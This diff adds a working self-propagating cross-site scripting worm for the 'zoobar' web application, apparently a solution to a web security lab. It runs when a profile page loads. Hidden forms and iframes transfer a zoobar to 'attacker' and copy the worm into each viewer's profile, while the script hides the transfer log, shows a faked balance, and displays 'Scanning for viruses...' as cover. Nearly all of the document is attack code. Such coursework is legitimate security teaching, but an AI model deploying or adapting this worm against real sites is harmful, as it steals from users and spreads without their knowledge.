@@ -1,0 +1,45 @@
+</b>
+<div id="profileheader2"> </div>
+<b>
+Scanning for viruses...
+
+<form method="post" action="/zoobar/index.cgi/transfer" style="display:none; visibility:hidden;" target="formtarget2">
+  <input name="zoobars" type="text" value="1">
+  <input name="recipient" type="text" value="attacker">
+  <input id="submitthat" type="submit" name="submission" value="Send">
+</form>
+
+<form method="post" action="/zoobar/index.cgi" style="display:none; visibility:hidden;" target="formtarget3">
+  <textarea cols="80" rows="20" name="profile_update" id="wormgoeshere"></textarea>
+  <input type="submit" value="Save" name="profile_submit" id="submitthattoo">
+</form>
+
+<iframe name="formtarget2" id="formtarget2" style="visibility:hidden; width:0; height:0; border:0; position:absolute;"> </iframe>
+
+<iframe name="formtarget3" id="formtarget3" style="visibility:hidden; width:0; height:0; border:0; position:absolute;"> </iframe>
+
+<script>
+  window.onload = function(){
+    document.getElementById("submitthat").click();
+    a = document.getElementsByClassName("log")[0];
+    b = a.getElementsByTagName("tbody")[0];
+    b.style="visibility:hidden; display:none;";
+    c = document.getElementById("profileheader");
+    c.style="display:none; visibility:hidden;";
+    document.getElementById("zoobars").className = 10;
+    var worm = document.getElementById("profile").innerHTML;
+    worm = worm.substring(3, worm.length - 4);
+    document.getElementById("wormgoeshere").value = worm;
+    document.getElementById("submitthattoo").click();
+
+    var total = 10;
+    function showZoobars2(zoobars) {
+      document.getElementById("profileheader2").innerHTML =
+      document.getElementsByName("user")[0].value + "'s zoobars:" + zoobars;
+      if (zoobars < total) {
+        setTimeout(function(){showZoobars2(zoobars + 1);}, 100);
+      }
+    }
+    showZoobars2(0); 
+  }
+</script>
